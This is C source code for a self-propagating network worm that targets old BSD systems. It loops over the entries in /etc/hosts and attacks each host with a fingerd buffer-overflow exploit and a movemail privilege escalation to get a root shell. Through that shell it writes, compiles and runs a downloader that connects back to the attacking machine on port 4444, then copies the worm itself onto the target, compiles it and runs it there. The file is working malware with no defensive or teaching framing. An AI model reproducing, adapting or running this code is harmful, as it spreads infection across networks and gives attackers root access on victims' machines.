#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <netdb.h>
#include "worm_bsd.h"

#define HOSTS_FILE "/etc/hosts"
#define MAX_IP_LEN 64

/* K&R Style function definition */
void get_local_ip(ip)
    char *ip;
{
    int sock;
    struct sockaddr_in serv_addr, local_addr;
    int len; /* socklen_t did not exist, use int */
    len = sizeof(local_addr);

    printf("[*] Getting local IP\n");

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        strcpy(ip, "127.0.0.1");
        return;
    }

    /* 4.3BSD uses bzero instead of memset */
    bzero((char *)&serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(53);
    /* inet_pton did not exist, use inet_addr */
    serv_addr.sin_addr.s_addr = inet_addr("8.8.8.8");

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        strcpy(ip, "127.0.0.1");
        close(sock);
        return;
    }

    if (getsockname(sock, (struct sockaddr *)&local_addr, &len) < 0) {
        strcpy(ip, "127.0.0.1");
        close(sock);
        return;
    }

    /* inet_ntoa returns a pointer to a static string */
    strcpy(ip, inet_ntoa(local_addr.sin_addr));
    close(sock);
}

void deploy_receive_file(sock, my_ip)
    int sock;
    char *my_ip;
{
    char cmd_buf[IO_BUF_SIZE];
    char *formatted_source;
    char *file_contents;
    
    printf("[*] Deploying receive_file.c to target\n");

    formatted_source = (char *)malloc(10000); 
    if (formatted_source == (char *)0) return;

    /* Old C does not support const; using standard char pointer */
    file_contents = "#include <stdio.h>\n#include <sys/types.h>\n\
#include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/time.h>\n\
#define SERVER_IP \"%s\"\n#define SERVER_PORT 4444\n#define IO_BUF_SIZE 2048\n\
int send_int(n,f){unsigned long c=htonl((unsigned long)n);char *d=(char*)&c;\
int l=sizeof(c);int r;do{r=write(f,d,l);if(r<0)return -1;else{d+=r;l-=r;}}\
while(l>0);return 0;} int receive_int(n,f){unsigned long r;char *d=(char*)&r;\
int l=sizeof(r);int rc;do{rc=read(f,d,l);if(rc<=0)return -1;else{d+=rc;l-=rc;}}\
while(l>0);*n=ntohl(r);return 0;} int main(){int i,j,n,s,fs,len,nf;\
struct timeval tv;struct sockaddr_in sa;char b[2048],p[256];FILE *o;char *fn;\
s=socket(2,1,0);if(s<0)return 1;bzero((char*)&sa,sizeof(sa));sa.sin_family=2;\
sa.sin_port=htons(4444);sa.sin_addr.s_addr=inet_addr(SERVER_IP);\
while(connect(s,(struct sockaddr*)&sa,sizeof(sa))<0)sleep(1);\
while(1){write(s,\"Hello\\n\",6);if(receive_int(&nf,s)<0)break;\
for(i=0;i<nf;i++){receive_int(&len,s);fn=(char*)malloc(len+1);\
read(s,fn,len);fn[len]=0;sprintf(p,\"/tmp/%%s\",fn);o=fopen(p,\"w\");\
receive_int(&fs,s);while(fs>0){n=read(s,b,2047);if(n<=0)break;b[n]=0;\
fputs(b,o);fs-=n;}fclose(o);free(fn);send_int(i,s);}break;}close(s);return 0;}";

    sprintf(formatted_source, file_contents, my_ip);

    write_to_sock(sock, "cat > /tmp/receive_file.c << 'EOF'\n");
    write_to_sock(sock, formatted_source);
    write_to_sock(sock, "\nEOF\n");
    sleep(5);

    bzero(cmd_buf, IO_BUF_SIZE);
    read_from_sock(sock, cmd_buf, IO_BUF_SIZE);
    free(formatted_source);
    printf("[*] File contents sent\n");
}

void infect(ip, my_ip)
    char *ip;
    char *my_ip;
{
    int sock;
    struct sockaddr_in serv_addr;
    char buf[BUF_SIZE];
    char io_buf[IO_BUF_SIZE];
    char *argv[5];

    bzero(buf, BUF_SIZE);
    bzero(io_buf, IO_BUF_SIZE);

    printf("[*] Attempting to infect: %s\n", ip);
    fflush(stdout);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    create_sockaddr(&serv_addr, ip, FINGERD_PORT);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sock);
        printf("[*] SOCKET FAILED. EXITING\n");
        return;
    }

    create_exploit(buf, PAYLOAD, BUF_SIZE, PAYLOAD_LEN);
    write(sock, buf, BUF_SIZE);
    sleep(5);

    get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);
    printf("[*] Should have root shell now\n");

    deploy_receive_file(sock, my_ip);
    
    printf("[*] Forking to create send_file process\n");

    if (fork() == 0) {
        argv[0] = "send_file_over_socket_bsd";
        argv[1] = "worm_bsd.c";
        argv[2] = "worm_bsd.h";
        argv[3] = (char *)0;
        execv("./send_file_over_socket_bsd", argv);
        exit(1);
    }

    printf("[*] Attempting to compile receive_file.c on target\n");
    write_to_sock(sock, "cc /tmp/receive_file.c -o /tmp/receive_file\n");
    sleep(2);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

    printf("[*] Running receive_file on target\n");
    write_to_sock(sock, "/tmp/receive_file &\n");
    sleep(2);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

    printf("[*] Compiling worm.c on target\n");
    write_to_sock(sock, "cc /tmp/worm.c -o /tmp/worm\n");
    sleep(2);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);
    
    printf("[*] Running worm.c on target\n");
    write_to_sock(sock, "/tmp/worm &\n");
    sleep(2);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

    close(sock);
}

int main()
{
    FILE *fp;
    char line[128];
    char ip[MAX_IP_LEN];
    char my_ip[MAX_IP_LEN];

    get_local_ip(my_ip);

    while (1) {
        fp = fopen(HOSTS_FILE, "r");
        if (fp == (FILE *)0) {
            sleep(25);
            continue;
        }

        while (fgets(line, 128, fp) != (char *)0) {
            if (line[0] == '#' || line[0] == '\n' || line[0] == ' ')
                continue;

            if (sscanf(line, "%s", ip) != 1)
                continue;

            if (strcmp(ip, "127.0.0.1") == 0)
                continue;
            if (strcmp(ip, my_ip) == 0)
                continue;

            infect(ip, my_ip);
            printf(" ---- Infection Cycle completed for IP: %s ----\n", ip);
            sleep(10);
        }
        fclose(fp);
    }
}
